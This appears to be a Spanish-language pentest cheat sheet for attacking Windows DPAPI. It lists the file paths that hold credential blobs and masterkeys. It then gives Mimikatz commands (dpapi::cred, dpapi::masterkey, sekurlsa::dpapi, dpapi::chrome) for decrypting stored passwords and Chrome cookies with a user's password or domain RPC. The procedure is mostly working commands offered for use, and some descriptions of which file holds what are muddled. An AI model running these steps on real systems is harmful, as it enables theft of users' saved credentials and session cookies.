# DPAPI secrets Attack
## Explicación
- DPAPI es un mecanismo de cifrado de datos que se utiliza para proteger los datos del usuario en Windows.
- Aplicaciones como Chrome, Outlook, etc. utilizan DPAPI para proteger las contraseñas.

### Que se necesita para hacer este ataque
- El SID del usuario
- El masterkey del usuario
- La contraseña del usuario
- `C:\users\<user>\appdata\local\microsoft\credentials\<blob>` (blob es un archivo binario que contiene la masterkey cifrada con la contraseña del usuario)
- `C:\users\<user>\appdata\roaming\microsoft\protect\<SID>\` (contiene el masterkey cifrado con la contraseña del usuario)

### Pasos
1. Obtener el SID del usuario: `whoami /user` o `wmic useraccount get name,sid`
2. Obtener el masterkey cifrado con la contraseña del usuario: `C:\users\<user>\appdata\local\microsoft\credentials\<blob>`
3. Obtener el masterkey cifrado con la contraseña del usuario: `C:\users\<user>\appdata\roaming\microsoft\protect\<SID>\`
4. Mimikatz: `dpapi::cred /in:C:\users\<user>\appdata\local\microsoft\credentials\<credential blob>`
- Nos guardamos `guidMasterKey` y `pbData`
- Revisar `c:\users\<user>\appdata\roaming\microsoft\protect\<SID>\` para ver si hay un archivo con el mismo `guidMasterKey`
- Si lo hay, usamos `mimikatz dpapi::masterkey /in:C:\users\<user>\appdata\roaming\microsoft\protect\<SID>\<guidMasterKey> /password:<password>`
- `mimikatz dpapi::masterkey /in:C:\users\<user>\appdata\roaming\microsoft\protect\<SID>\<MasterKey blob> /rpc`

### Otros comandos
- `sekurlsa::dpapi` conseguimos las masterkeys cifradas con la contraseña del usuario
- Ahora podemos hacer `dpapi::masterkey /in:C:\users\<user>\appdata\roaming\microsoft\protect\<SID>\<guidMasterKey> /password:<password>`
- `dpapi::chrome /in:"C:\Users\kbell\AppData\Local\Google\Chrome\User Data\Default\Cookies" /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca 0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b`

### Referencias
- [Fortra](https://www.coresecurity.com/core-labs/articles/reading-dpapi-encrypted-keys-mimikatz)
- [Hack Tricks Wiki](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html?highlight=dpapi#master-keys)